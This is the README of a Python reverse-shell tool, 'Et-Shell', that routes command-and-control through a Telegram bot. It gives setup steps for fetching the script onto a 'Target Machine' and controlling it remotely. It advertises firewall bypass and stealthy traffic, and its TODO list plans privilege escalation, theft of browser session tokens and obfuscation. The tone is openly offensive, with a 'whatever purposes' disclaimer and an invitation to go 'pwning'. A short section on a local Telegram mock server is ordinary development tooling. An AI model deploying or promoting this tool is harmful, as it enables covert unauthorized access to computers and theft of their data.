# ⚡ Et-Shell – The Easiest Reverse Shell You’ll Ever Use!

Forget complicated setups. **Et-sHell** gives you a **fully functional reverse shell** using **Telegram**—no need for a remote server, no open ports, no headaches. Just straight-up shell access, routed through Telegram’s servers.

## 🔥 Why etShell?

-   **Broke? No server?, no problem** – No need to set up a VPS, configure nginx rules or expose your IP.
-   **Firewall? Bypass it.** – No open ports, no NAT issues, just seamless communication.
-   **Command & Control via Telegram** – Send shell commands from your girlfriend's dorm room with your phone.
-   **Discreet & Stealthy** – Blends in like a ghost – Telegram traffic = Innocent AF!.
-   **File Transfers** – Upload and download files.
-   **Live Mode** – Watch command output in real-time.

## 🛠️ Setup in 60 Seconds

1.  **Create a Telegram bot** via [@BotFather](https://t.me/BotFather).
2.  **Clone this repo on your Target Machine/ wget [`etshell.py`](https://raw.githubusercontent.com/0xdotgz/Et-Shell/refs/heads/main/etshell.py)** :
    
    ```
    git clone https://github.com/0xdotgz/Et-Shell   
    ```
    
3.  **Install dependencies**:
    
    ```
    pip install telepot  
    ```
        
 4. **Paste your bot `TOKEN` obtained from  [@BotFather](https://t.me/BotFather) in `etshell.py`.**
    
5.  **Run it**:
    
    ```
    python etshell.py  
    ```
    
5.  **Start commanding your Target Machine via Telegram.**

## 🔜 TODO:

- [ ] Grab the Telegram Bot TOKEN from a remote source securely every time the program executes
- [ ] Implement local enumeration for privilege escalation
- [ ] Retrieve plaintext details and browser session tokens
- [ ] Apply obfuscation techniques


## ⚠️ Disclaimer

This tool is for **whatever purposes** and make sure your bot token stays safe. If you use it for anything shady, that's on you. Don’t be dumb.

Now go have some fun pwning!

## Development utilities: local Telegram mock server

For faster development and deterministic testing you can run a local
Telegram Bot API mock that emulates `api.telegram.org` and provides an
Admin API for injecting updates. This project integrates well with
`skrashevich/telegram-mock-ai`.

Quick start (recommended: Docker + Ollama):

1. Clone the mock repo under `tools/telegram-mock-ai` or use the helper
    script `tools/telegram-mock-ai/setup.ps1`.
2. Copy `config.example.yaml` to `config.yaml` and adjust settings if
    needed.
3. Start the services:

```powershell
cd tools/telegram-mock-ai/telegram-mock-ai
docker compose up -d
```

On first run, if using Ollama, pull a model into the Ollama container:

```powershell
docker exec -it ollama ollama pull llama3
```

The mock Bot API will be available at `http://localhost:8081` and the
Admin API at `http://localhost:8082`.

See `tools/telegram-mock-ai/README.md` for more details and helper
commands.

[![Telegram](https://badgen.net/badge/icon/Don't%20be%20an%20skid!?icon=telegram&label=DM%20for%20Queries)](https://t.me://hello_elliot_bot)
----------

#### LICENSE
```
             DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
                    Version 2, December 2004

 Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>

 Everyone is permitted to copy and distribute verbatim or modified
 copies of this license document, and changing it is allowed as long
 as the name is changed.

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. You just DO WHAT THE FUCK YOU WANT TO.

```
